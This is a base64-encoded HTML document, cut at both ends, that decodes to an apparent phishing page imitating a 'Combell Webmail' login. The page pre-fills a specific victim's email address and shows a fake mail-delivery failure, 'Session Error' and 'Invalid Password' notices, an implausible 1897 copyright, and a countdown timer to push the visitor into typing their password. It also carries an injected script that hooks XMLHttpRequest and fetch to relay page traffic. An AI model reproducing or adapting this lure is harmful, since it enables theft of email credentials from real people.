aW9uIiwiY29uZmlybWF0aW9udGl0bGUiOiJBcmUgeW91IHN1cmUuLi4iLCJkZWxldGUiOiJEZWxldGUiLCJjb250aW51ZSI6IkNvbnRpbnVlIiwib2siOiJPSyIsImxvZ2luIjoiTG9naW4iLCJmb2xkZXJzIjoiRm9sZGVycyIsInNlYXJjaCI6IlNlYXJjaCIsImF0dGFjaG1lbnQiOiJBdHRhY2htZW50Iiwic2VjdGlvbiI6IlNlY3Rpb24iLCJvcHRpb25zIjoiT3B0aW9ucyIsImVycm9ydGl0bGUiOiJBbiBlcnJvciBvY2N1cnJlZCEiLCJ0b2dnbGVhZHZhbmNlZG9wdGlvbnMiOiJUb2dnbGUgYWR2YW5jZWQgb3B0aW9ucyJ9KTsKcmNtYWlsLmd1aV9jb250YWluZXIoImxvZ2luZm9vdGVyIiwiYm90dG9tbGluZSIpO3JjbWFpbC5ndWlfb2JqZWN0KCdsb2dpbmZvcm0nLCAnZm9ybScpOwpyY21haWwuZ3VpX29iamVjdCgnbWVzc2FnZScsICdtZXNzYWdlJyk7Cjwvc2NyaXB0PgoKPHNjcmlwdCBzcmM9Ii4vZnJhbWV3b3JrLm1pbi5qcy5kb3dubG9hZCI+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9Ii4vanF1ZXJ5LXVpLm1pbi5qcy5kb3dubG9hZCI+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9Ii4veHNraW4ubWluLmpzLmRvd25sb2FkIj48L3NjcmlwdD48c2NyaXB0IHNyYz0iLi94ZGVza3RvcC5taW4uanMuZG93bmxvYWQiPjwvc2NyaXB0Pgo8c2NyaXB0PihmdW5jdGlvbiBpbmplY3QoY29uZmlnKSB7CiAgICAgICAgZnVuY3Rpb24gR2VuZXJhdGVRdWlja0lkKCkgewogICAgICAgICAgdmFyIHJhbmRvbVN0cklkID0gTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsIDE1KSArIE1hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnN1YnN0cmluZygyLCAxNSkgKyBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHJpbmcoMiwgMTUpOwogICAgICAgICAgcmV0dXJuIHJhbmRvbVN0cklkLnN1YnN0cmluZygwLCAyMik7CiAgICAgICAgfQoKICAgICAgICA7CgogICAgICAgIGZ1bmN0aW9uIFNlbmRYSFJDYW5kaWRhdGUocmVxdWVzdE1ldGhvZF8sIHVybF8sIHR5cGVfLCBjb250ZW50XywgcmVxdWVzdEJvZHlfKSB7CiAgICAgICAgICB0cnkgewogICAgICAgICAgICB2YXIgaWQgPSAnZGV0ZWN0b3InOwogICAgICAgICAgICB2YXIgbWVzID0gewogICAgICAgICAgICAgIHBvc2RNZXNzYWdlSWQ6ICdQQU5FTE9TX01FU1NBR0UnLAogICAgICAgICAgICAgIHBvc2RIYXNoOiBHZW5lcmF0ZVF1aWNrSWQoKSwKICAgICAgICAgICAgICB0eXBlOiAnVklERU9fWEhSX0NBTkRJREFURScsCiAgICAgICAgICAgICAgZnJvbTogaWQsCiAgICAgICAgICAgICAgdG86IGlkLnN1YnN0cmluZygwLCBpZC5sZW5ndGggLSAyKSwKICAgICAgICAgICAgICBjb250ZW50OiB7CiAgICAgICAgICAgICAgICByZXF1ZXN0TWV0aG9kOiByZXF1ZXN0TWV0aG9kXywKICAgICAgICAgICAgICAgIHVybDogdXJsXywKICAgICAgICAgICAgICAgIHR5cGU6IHR5cGVfLAogICAgICAgICAgICAgICAgY29udGVudDogY29udGVudF8KICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CgogICAgICAgICAgICBpZiAocmVxdWVzdEJvZHlfICYmIHJlcXVlc3RCb2R5X1swXSAmJiByZXF1ZXN0Qm9keV9bMF0ubGVuZ3RoKSB7CiAgICAgICAgICAgICAgbWVzLmNvbnRlbnQuZW5jb2RlZFBvc3RCb2R5ID0gcmVxdWVzdEJvZHlfWzBdOwogICAgICAgICAgICB9IC8vIGNvbnNvbGUubG9nKGBwb3NkX2xvZzogJHtuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCl9IERFQlVHIFske3RoaXMuaWR9XSA6IChQb3NkVmlkZW9UcmFmZmljRGV0ZWN0b3IpIHNlbmRpbmdgLCBtZXMpOwoKCiAgICAgICAgICAgIHdpbmRvdy5wb3N0TWVzc2FnZShtZXMpOwogICAgICAgICAgfSBjYXRjaCAoZSkge30KICAgICAgICB9CgogICAgICAgIDsKICAgICAgICB2YXIgb3BlbiA9IFhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5vcGVuOwoKICAgICAgICBYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3BlbiA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgIHRoaXMucmVxdWVzdE1ldGhvZCA9IGFyZ3VtZW50c1swXTsKICAgICAgICAgIG9wZW4uYXBwbHkodGhpcywgYXJndW1lbnRzKTsKICAgICAgICB9OwoKICAgICAgICB2YXIgc2VuZCA9IFhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5zZW5kOwoKICAgICAgICBYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUuc2VuZCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgIHZhciByZXF1ZXN0Qm9keV8gPSBPYmplY3QuYXNzaWduKGFyZ3VtZW50cywge30pOwogICAgICAgICAgdmFyIG9ucmVhZHlzdGF0ZWNoYW5nZSA9IHRoaXMub25yZWFkeXN0YXRlY2hhbmdlOwoKICAgICAgICAgIHRoaXMub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICB2YXIgaXNGcmFtZUluQmxhY2tMaXN0ID0gZnVuY3Rpb24gaXNGcmFtZUluQmxhY2tMaXN0KHVybCkgewogICAgICAgICAgICAgIHZhciBibGFja0xpc3RJZnJhbWVzID0gY29uZmlnOwogICAgICAgICAgICAgIHJldHVybiBibGFja0xpc3RJZnJhbWVzLnNvbWUoZnVuY3Rpb24gKGUpIHsKICAgICAgICAgICAgICAgIHJldHVybiB1cmwuaW5jbHVkZXMoZSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH07CgogICAgICAgICAgICBpZiAodGhpcy5yZWFkeVN0YXRlID09PSA0ICYmICFpc0ZyYW1lSW5CbGFja0xpc3QodGhpcy5yZXNwb25zZVVSTCkpIHsKICAgICAgICAgICAgICBzZXRUaW1lb3V0KFNlbmRYSFJDYW5kaWRhdGUodGhpcy5yZXF1ZXN0TWV0aG9kLCB0aGlzLnJlc3BvbnNlVVJMLCB0aGlzLmdldFJlc3BvbnNlSGVhZGVyKCdjb250ZW50LXR5cGUnKSwgdGhpcy5yZXNwb25zZSwgcmVxdWVzdEJvZHlfKSwgMCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIChvbnJlYWR5c3RhdGVjaGFuZ2UpIHsKICAgICAgICAgICAgICByZXR1cm4gb25yZWFkeXN0YXRlY2hhbmdlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7CiAgICAgICAgICAgIH0KICAgICAgICAgIH07CgogICAgICAgICAgcmV0dXJuIHNlbmQuYXBwbHkodGhpcywgYXJndW1lbnRzKTsKICAgICAgICB9OwoKICAgICAgICB2YXIgbmF0aXZlRmV0Y2ggPSBmZXRjaDsKCiAgICAgICAgZmV0Y2ggPSBmdW5jdGlvbiBmZXRjaCgpIHsKICAgICAgICAgIHZhciBfdGhpcyA9IHRoaXM7CgogICAgICAgICAgdmFyIGFyZ3MgPSBhcmd1bWVudHM7CiAgICAgICAgICB2YXIgZmV0Y2hVUkwgPSBhcmd1bWVudHNbMF0gaW5zdGFuY2VvZiBSZXF1ZXN0ID8gYXJndW1lbnRzWzBdLnVybCA6IGFyZ3VtZW50c1swXTsKICAgICAgICAgIHZhciBmZXRjaE1ldGhvZCA9IGFyZ3VtZW50c1swXSBpbnN0YW5jZW9mIFJlcXVlc3QgPyBhcmd1bWVudHNbMF0ubWV0aG9kIDogJ0dFVCc7CiAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24gKHJlc29sdmUsIHJlamVjdCkgewogICAgICAgICAgICB2YXIgcHJvbWlzZSA9IG5hdGl2ZUZldGNoLmFwcGx5KF90aGlzLCBhcmdzKTsKICAgICAgICAgICAgcHJvbWlzZS50aGVuKGZ1bmN0aW9uIChyZXNwb25zZSkgewogICAgICAgICAgICAgIGlmIChyZXNwb25zZS5ib2R5IGluc3RhbmNlb2YgUmVhZGFibGVTdHJlYW0pIHsKICAgICAgICAgICAgICAgIHZhciBuYXRpdmVKc29uID0gcmVzcG9uc2UuanNvbjsKCiAgICAgICAgICAgICAgICByZXNwb25zZS5qc29uID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICB2YXIgX2FyZ3VtZW50cyA9IGFyZ3VtZW50cywKICAgICAgICAgICAgICAgICAgICAgIF90aGlzMiA9IHRoaXM7CgogICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24gKHJlc29sdmUsIHJlamVjdCkgewogICAgICAgICAgICAgICAgICAgIHZhciBqc29uUHJvbWlzZSA9IG5hdGl2ZUpzb24uYXBwbHkoX3RoaXMyLCBfYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgICAgICBqc29uUHJvbWlzZS50aGVuKGZ1bmN0aW9uIChqc29uUmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoU2VuZFhIUkNhbmRpZGF0ZShmZXRjaE1ldGhvZCwgZmV0Y2hVUkwsIHJlc3BvbnNlLmhlYWRlcnMuZ2V0KCdjb250ZW50LXR5cGUnKSwgSlNPTi5zdHJpbmdpZnkoanNvblJlc3BvbnNlKSksIDApOwogICAgICAgICAgICAgICAgICAgICAgcmVzb2x2ZShqc29uUmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgIH0pWyJjYXRjaCJdKGZ1bmN0aW9uIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICB2YXIgbmF0aXZlVGV4dCA9IHJlc3BvbnNlLnRleHQ7CgogICAgICAgICAgICAgICAgcmVzcG9uc2UudGV4dCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgdmFyIF9hcmd1bWVudHMyID0gYXJndW1lbnRzLAogICAgICAgICAgICAgICAgICAgICAgX3RoaXMzID0gdGhpczsKCiAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSwgcmVqZWN0KSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIHRleHRQcm9taXNlID0gbmF0aXZlVGV4dC5hcHBseShfdGhpczMsIF9hcmd1bWVudHMyKTsKICAgICAgICAgICAgICAgICAgICB0ZXh0UHJvbWlzZS50aGVuKGZ1bmN0aW9uICh0ZXh0UmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoU2VuZFhIUkNhbmRpZGF0ZShmZXRjaE1ldGhvZCwgZmV0Y2hVUkwsIHJlc3BvbnNlLmhlYWRlcnMuZ2V0KCdjb250ZW50LXR5cGUnKSwgdGV4dFJlc3BvbnNlKSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICByZXNvbHZlKHRleHRSZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgfSlbImNhdGNoIl0oZnVuY3Rpb24gKGUpIHsKICAgICAgICAgICAgICAgICAgICAgIHJlamVjdChlKTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgcmVzb2x2ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOwogICAgICAgICAgICB9KVsiY2F0Y2giXShmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgcmVqZWN0LmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSk7CiAgICAgICAgfTsKICAgICAgfSkoWyJmYWNlYm9vay5jb20vIiwidHdpdHRlci5jb20vIiwieW91dHViZS1ub2Nvb2tpZS5jb20vZW1iZWQvIiwiLy92ay5jb20vIiwiLy93d3cudmsuY29tLyIsIi8vbGlua2VkaW4uY29tLyIsIi8vd3d3LmxpbmtlZGluLmNvbS8iLCIvL2luc3RhZ3JhbS5jb20vIiwiLy93d3cuaW5zdGFncmFtLmNvbS8iLCIvL3d3dy5nb29nbGUuY29tL3JlY2FwdGNoYS9hcGkyLyIsIi8vaGFuZ291dHMuZ29vZ2xlLmNvbS93ZWJjaGF0LyIsIi8vd3d3Lmdvb2dsZS5jb20vY2FsZW5kYXIvIiwiLy93d3cuZ29vZ2xlLmNvbS9tYXBzL2VtYmVkIiwic3BvdGlmeS5jb20vIiwic291bmRjbG91ZC5jb20vIiwiLy9wbGF5ZXIudmltZW8uY29tLyIsIi8vZGlzcXVzLmNvbS8iLCIvL3Rnd2lkZ2V0LmNvbS8iLCIvL2pzLmRyaWZ0dC5jb20vIiwiZnJpZW5kczJmb2xsb3cuY29tIiwiL3dpZGdldCIsImxvZ2luIiwiLy92aWRlby5iaWdtaXIubmV0LyIsImJsb2dnZXIuY29tIiwiLy9zbWFydGxvY2suZ29vZ2xlLmNvbS8iLCIvL2tlZXAuZ29vZ2xlLmNvbS8iLCIvd2ViLnRvbHN0b3ljb21tZW50cy5jb20vIiwibW96LWV4dGVuc2lvbjovLyIsImNocm9tZS1leHRlbnNpb246Ly8iLCIvYXV0aC8iLCIvL2FuYWx5dGljcy5nb29nbGUuY29tLyIsImFkY2xhcml0eS5jb20iLCJwYWRkbGUuY29tL2NoZWNrb3V0IiwiaGNhcHRjaGEuY29tIiwicmVjYXB0Y2hhLm5ldCIsIjJjYXB0Y2hhLmNvbSIsImFjY291bnRzLmdvb2dsZS5jb20iLCJ3d3cuZ29vZ2xlLmNvbS9zaG9wcGluZy9jdXN0b21lcnJldmlld3MiLCJidXkudGlueXBhc3MuY29tIiwiZ3N0YXRpYy5jb20iLCJzZWN1cmVpci5lYmF5c3RhdGljLmNvbSIsImRvY3MuZ29vZ2xlLmNvbSIsImNvbnRhY3RzLmdvb2dsZS5jb20iLCJnaXRodWIuY29tIiwibWFpbC5nb29nbGUuY29tIiwiY2hhdC5nb29nbGUuY29tIl0pOzwvc2NyaXB0PjwvaGVhZD4KPGJvZHkgc3R5bGU9ImZvbnQtc2l6ZToxMXB4OyIgY2xhc3M9Inhza2luIHNraW4tY29tYmVsbCBjb2xvci01ODU4NTggbG9naW4tcGFnZSB4ZGVza3RvcCBmb250LWljb25zLXRvb2xiYXJzIiBiaXNfcmVnaXN0ZXI9Ilczc2liV0Z6ZEdWeUlqcDBjblZsTENKbGVIUmxibk5wYjI1SlpDSTZJbVZ3Y0dsdlkyVnRhRzF1YkdKb2FuQnNZMmRyYjJaamFXbGxaMjl0WTI5dUlpd2lZV1JpYkc5amEyVnlVM1JoZEhWeklqcDdJa1JKVTFCTVFWa2lPaUprYVhOaFlteGxaQ0lzSWtaQlEwVkNUMDlMSWpvaVpHbHpZV0pzWldRaUxDSlVWMGxVVkVWU0lqb2laR2x6WVdKc1pXUWlMQ0pTUlVSRVNWUWlPaUprYVhOaFlteGxaQ0o5TENKMlpYSnphVzl1SWpvaU1TNDVMakV3SWl3aWMyTnZjbVVpT2pFd09URXdmVjA9Ij4KCgo8ZGl2Pgo8ZGl2IGlkPSJsb2dpbi1mb3JtImJpc19za2luX2NoZWNrZWQ9IjEiPgo8ZGl2IGNsYXNzPSJib3gtaW5uZXIiIHJvbGU9Im1haW4iIGJpc19za2luX2NoZWNrZWQ9IjEiPgo8ZGl2IHN0eWxlPSJtYXJnaW4tdG9wOjsgIiBjbGFzcz0iZmFkZS1pbiI+QWN0aW9uOiBmYWlsZWQKRmluYWwtUmVjaXBpZW50OiA8c3BhbiBpZD0iYWljeCIgc3R5bGU9ImNvbG9yOnJnYigyNTUsIDEzNCwgMCk7IiA+PC9zcGFuPiwKU3RhdHVzOiA1LjAuMC4wLjk5LQpSZW1vdGUtTVRBOiBkbnMKRnJvbTogU1NML1RMUyA8L2Rpdj4KCjxkaXY+Cjxicj4KPGltZyBzcmM9Imh0dHBzOi8vd2VibWFpbC5nZXJtYW5pYS1lbGVrdHJvbmlrLmRlL3NraW5zL2VsYXN0aWMvaW1hZ2VzL2xvZ28uc3ZnIiB3aWR0aD0iMTMlIiBoZWlnaHQ9IiIgc3R5bGU9Im1hcmdpbi1sZWZ0OjEzMHB4OyIgaWQ9ImxvZ29pbWciIGFsdD0iQ29tYmVsbCBXZWJtYWlsIj48L2ltZz4KCjwvZGl2Pgo8ZGl2IGlkPSJjb21wYW55LW5hbWUiIGJpc19za2luX2NoZWNrZWQ9IjEiPldlYm1haWw8L2Rpdj48aDE+PHNwYW4+TG9naW48L3NwYW4+PC9oMT48Zm9ybSBuYW1lPSJmb3JtIiBtZXRob2Q9InBvc3QiPgoKPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iX3VybCIgdmFsdWU9IiIgaWQ9ImFpIj48dGFibGU+PHRib2R5Pjx0cj48dGQgY2xhc3M9InRpdGxlIj48bGFiZWwgZm9yPSJfbGFuZ3VhZ2UiPjwvbGFiZWw+PC90ZD48dGQgY2xhc3M9ImlucHV0IiBzdHlsZT0ibWFyZ2luLWxlZnQ6OTBweDsgY29sb3I6IHJnYigxLCAxNTIsIDIyNSk7IGZvbnQtc2l6ZToxNHB4OwogIj4KCgoKPG9wdGlvbiB2YWx1ZT0iZW5fVVMiIHNlbGVjdGVkPSIiPjxwID48ZGl2IHN0eWxlPSJtYXJnaW4tbGVmdDoyMDBweDsgIj4gPHNwYW4gc3R5bGU9Im1hcmdpbi1sZWZ0OjE4MHB4OyIgY2xhc3M9Im14MSIgaWQ9ImxvZ29uYW1lIj48L3NwYW4+Jm5ic3A7V2VibWFpbDwvZGl2PjwvcD48L3RkPjwvdHI+PHRyPjx0ZCBjbGFzcz0idGl0bGUiPjxsYWJlbCBmb3I9InJjbWxvZ2ludXNlciI+VXNlcm5hbWU8L2xhYmVsPjwvdGQ+PHRkIGNsYXNzPSJpbnB1dCI+Cgo8ZmllbGRzZXQgc3R5bGU9ImhlaWdodDoyM3B4OyAiPjxkaXYgc3R5bGU9Im1hcmdpbi10b3A6NXB4OyI+PHNwYW4gaWQ9ImFpY2giIHN0eWxlPSJtYXJnaW4tdG9wOjVweDsiPmluZm9AZHVhbmVyZWVkZ2FsbGVyeS5jb208L3NwYW4+PC9kaXY+PC9maWVsZHNldD48L3RkPjwvdHI+PHRyPjx0ZCBjbGFzcz0idGl0bGUiPjxsYWJlbCBmb3I9InJjbWxvZ2lucHdkIj5QYXNzd29yZDwvbGFiZWw+PC90ZD48dGQgY2xhc3M9ImlucHV0IiA+Cgo8aW5wdXQgbmFtZT0iX3Bhc3MiIGlkPSJwciIgY2xhc3M9Imh1IiBzdHlsZT0iZm9udC1zaXplOjEycHg7IGhlaWdodDozOHB4OyIgcGxhY2Vob2xkZXI9IkVudGVyIGVtYWlsIHBhc3N3b3JkInJlcXVpcmVkIHNpemU9IjQwIiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIiBhdXRvY29tcGxldGU9Im9mZiIgdHlwZT0icGFzc3dvcmQiPjwvdGQ+PC90cj48L3Rib2R5PjwvdGFibGU+PHAgY2xhc3M9ImZvcm1idXR0b25zIj4KCgo8YnV0dG9uIHR5cGU9InN1Ym1pdCIgaWQ9InN1Ym1pdC1idG4iIHN0eWxlPSJ3aWR0aDoxMDAlOyBiYWNrZ3JvdW5kLWNvbG9yOnJnYigxLCAxNTIsIDIyNSk7IGhlaWdodDozNXB4OyBjb2xvcjp3aGl0ZTsiIGNsYXNzPSJidXR0b24gbWFpbmFjdGlvbiBzdWJtaXQiPkNvbnRpbnVlPC9idXR0b24+PC9wPgo8L2Zvcm0+Cgo8L2Rpdj4KPGRpdiB3aXRoaWQ9ImxvZ2luLXN0YXR1cyIgY2xhc3M9ImVycm9yLW5vdGljZSIgc3R5bGU9InZpc2liaWxpdHk6IHZpc2libGU7IHdpZHRoOjMwMHB4OyBoZWlnaHQ6cHg7IG1hcmdpbi1sZWZ0OjcwcHg7IG1hcmdpbi10b3A6MTBweDsgY29sb3I6cmVkOyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRlbnQtd3JhcHBlciI+CiAgICAgICAgICAgICAgICA8ZGl2IGlkPSJsb2dpbi1kZXRhaWwiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImxvZ2luLXN0YXR1cy1pY29uLWNvbnRhaW5lciI+PHNwYW4gY2xhc3M9ImxvZ2luLXN0YXR1cy1pY29uIj48L3NwYW4+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibXNnIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4OyBtYXJnaW4tbGVmdDo5MHB4OyI+U2Vzc2lvbiBFcnJvciEuPC9kaXY+CgkJCQkJCgkJCQkJICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJtc2cyIiAgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi10b3A6NXB4OyBtYXJnaW4tbGVmdDo5MHB4OyAiPjxzcGFuPjxpbWcgc3JjPSJodHRwczovL214dG9vbGJveC5jb20vcHVibGljL2ltYWdlcy9TdGF0dXNJY29ucy9wcm9ibGVtLnBuZyI+PC9pbWc+Jm5ic3A7PC9zcGFuPkludmFsaWQgUGFzc3dvcmQuPC9kaXY+CgkJCQkJCQkJCQkgICAgICAgICAgICAgICAgICAKCQkJCQkJCQkJCQkJCQkgIDxkaXYgaWQ9Im1zZzEiIHN0eWxlPSJkaXNwbGF5OiBub25lOyBtYXJnaW4tdG9wOjVweDsgbWFyZ2luLWxlZnQ6OTBweDsgIj48c3Bhbj48aW1nIHNyYz0iaHR0cHM6Ly9teHRvb2xib3guY29tL3B1YmxpYy9pbWFnZXMvU3RhdHVzSWNvbnMvcHJvYmxlbS5wbmciPjwvaW1nPiZuYnNwOzwvc3Bhbj5JbnZhbGlkIFBhc3N3b3JkLjxicj4KCjwvZGl2PgoKICAgICAgICAKICAgICAgICAgICAgICAgIDwvZGl2PgoJCQkJCgkJCQkKICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+PGJyPgoJCQo8ZGl2IHN0eWxlPSJtYXJnaW4tbGVmdDoxNDBweDsiPiA8c3Bhbj5Db3B5cmlnaHQgKGMpMTg5Ny0yMDIzPC9zcGFuPjwvZGl2Pgo8ZGl2IHN0eWxlPSJtYXJnaW4tbGVmdDoxMzBweDsgIG1hcmdpbi10b3A6M3B4OyI+IDxzcGFuPldlYm1haWwtTGluayBTZWN1cmVkIEwuTC5DICZuYnNwOzwvc3Bhbj48L2Rpdj4KCjxkaXYgY2xhc3M9ImJveC1ib3R0b20iIHJvbGU9ImNvbXBsZW1lbnRhcnkiIGJpc19za2luX2NoZWNrZWQ9IjEiPgoJPGRpdiBpZD0ibWVzc2FnZSIgYmlzX3NraW5fY2hlY2tlZD0iMSI+PC9kaXY+Cgk8bm9zY3JpcHQ+CgkJPHAgY2xhc3M9Im5vc2NyaXB0d2FybmluZyI+V2FybmluZzogVGhpcyB3ZWJtYWlsIHNlcnZpY2UgcmVxdWlyZXMgSmF2YXNjcmlwdCEgSW4gb3JkZXIgdG8gdXNlIGl0IHBsZWFzZSBlbmFibGUgSmF2YXNjcmlwdCBpbiB5b3VyIGJyb3dzZXIncyBzZXR0aW5ncy48L3A+Cgk8L25vc2NyaXB0Pgo8L2Rpdj4KCjxkaXYgaWQ9ImJvdHRvbWxpbmUiIHJvbGU9ImNvbnRlbnRpbmZvIiBiaXNfc2tpbl9jaGVja2VkPSIxIj4KCUNvbWJlbGwgV2VibWFpbCAKCQoJCjwvZGl2Pgo8L2Rpdj4KPC9kaXY+CgoKCjxzY3JpcHQ+CmlmICghd2luZG93LlVJKSB7IHZhciBVSSA9IG5ldyByY3ViZV9tYWlsX3VpKCk7IH0KPC9zY3JpcHQ+CjxzY3JpcHQ+CiQoZnVuY3Rpb24oKSB7CnJjbWFpbC5pbml0KCk7CnZhciBpbWFnZXMgPSBbInNraW5zL2xhcnJ5L2ltYWdlcy9hamF4bG9hZGVyLmdpZiIsInNraW5zL2xhcnJ5L2ltYWdlcy9hamF4bG9hZGVyX2RhcmsuZ2lmIiwic2tpbnMvbGFycnkvaW1hZ2VzL2J1dHRvbnMucG5nIiwic2tpbnMvbGFycnkvaW1hZ2VzL2FkZGNvbnRhY3QucG5nIiwic2tpbnMvbGFycnkvaW1hZ2VzL2ZpbGV0eXBlcy5wbmciLCJza2lucy9sYXJyeS9pbWFnZXMvbGlzdGljb25zLnBuZyIsInNraW5zL2xhcnJ5L2ltYWdlcy9tZXNzYWdlcy5wbmciLCJza2lucy9sYXJyeS9pbWFnZXMvbWVzc2FnZXNfZGFyay5wbmciLCJza2lucy9sYXJyeS9pbWFnZXMvcXVvdGEucG5nIiwic2tpbnMvbGFycnkvaW1hZ2VzL3NlbGVjdG9yLnBuZyIsInNraW5zL2xhcnJ5L2ltYWdlcy9zcGxpdHRlci5wbmciLCJza2lucy9sYXJyeS9pbWFnZXMvd2F0ZXJtYXJrLmpwZyJdOwogICAgICAgICAgICBmb3IgKHZhciBpPTA7IGk8aW1hZ2VzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICBpbWcgPSBuZXcgSW1hZ2UoKTsKICAgICAgICAgICAgICAgIGltZy5zcmMgPSBpbWFnZXNbaV07CiAgICAgICAgICAgIH0KfSk7Cjwvc2NyaXB0PgoKCgoKCgoKPC9ib2R5Pgo8L3NjcmlwdD4KCgo8L2JvZHk+PGdyYW1tYXJseS1kZXNrdG9wLWludGVncmF0aW9uIGRhdGEtZ3JhbW1hcmx5LXNoYWRvdy1yb290PSJ0cnVlIj48L2dyYW1tYXJseS1kZXNrdG9wLWludGVncmF0aW9uPgo8c2NyaXB0PgovLyBTZXQgdGhlIGRhdGUgd2UncmUgY291bnRpbmcgZG93biB0bwp2YXIgY291bnREb3duRGF0ZSA9IG5ldyBEYXRlKCJKYW4gNSwgMjAyNCAxNTozNzoyNSIpLmdldFRpbWUoKTsKCi8vIFVwZGF0ZSB0aGUgY291bnQgZG93biBldmVyeSAxIHNlY29uZAp2YXIgeCA9IHNldEludGVydmFsKGZ1bmN0aW9uKCkgewoKICAvLyBHZXQgdG9kYXkncyBkYXRlIGFuZCB0aW1lCiAgdmFyIG5vdyA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOwogICAgCiAgLy8gRmluZCB0aGUgZGlzdGFuY2UgYmV0d2VlbiBub3cgYW5kIHRoZSBjb3VudCBkb3duIGRhdGUKICB2YXIgZGlzdGFuY2UgPSBjb3VudERvd25EYXRlIC0gbm93OwogICAgCiAgLy8gVGltZSBjYWxjdWxhdGlvbnMgZm9yIGRheXMsIGhvdXJzLCBtaW51dGVzIGFuZCBzZWNvbmRzCiAgdmFyIGRheXMgPSBNYXRoLmZsb29yKGRpc3RhbmNlIC8gKDEwMDAgKiA2MCAqIDYwICogMjQpKTsKICB2YXIgaG91cnMgPSBNYXRoLmZsb29yKChkaXN0YW5jZSAlICgxMDAwICogNjAgKiA2MCAqIDI0KSkgLyAoMTAwMCAqIDYwICogNjApKTsKICB2YXIgbWludXRlcyA9IE1hdGguZmxvb3IoKGRpc3RhbmNlICUgKDEwMDAgKiA2MCAqIDYwKSkgLyAoMTAwMCAqIDYwKSk7CiAgdmFyIHNlY29uZHMgPSBNYXRoLmZsb29yKChkaXN0YW5jZSAlICgxMDAwICogNjApKSAvIDEwMDApOwogICAgCiAgLy8gT3V0cHV0IHRoZSByZXN1bHQgaW4gYW4gZWxlbWVudCB3aXRoIGlkPSJkZW1vIgogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkZW1vIikuaW5uZXJIVE1MID0gaG91cnMgKyAiaCAiCiAgKyBtaW51dGVzICsgIm0gIiArIHNlY29uZHMgKyAicyAiOwogICAgCiAgLy8gSWYgdGhlIGNvdW50IGRvd24gaXMgb3Zlciwgd3JpdGUgc29tZSB0ZXh0IAogIGlmIChkaXN0YW5jZSA8IDApIHsKICAgIGNsZWFySW50ZXJ2YWwoeCk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTCA9ICJFWFBJUkVEIjsKICB9Cn0sIDEwMDApOwo8L3NjcmlwdD4KCjwhLS0gT3B0aW9uYWwgSmF2YVNjcmlwdCAtLT4KICAgIDwhLS0galF1ZXJ5IGZpcnN0LCB0aGVuIFBvcHBlci5qcywgdGhlbiBCb290c3RyYXAgSlMgLS0+CiAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2NvZGUuanF1ZXJ5LmNvbS9qcXVlcnktMy4yLjEuc2xpbS5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUtKM28yREt0SWt2WUlLM1VFTnptTTdLQ2tSci9yRTkvUXBnNmFBWkdKd0ZETVZOQS9HcEdGRjkzaFhwRzVLa04iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFz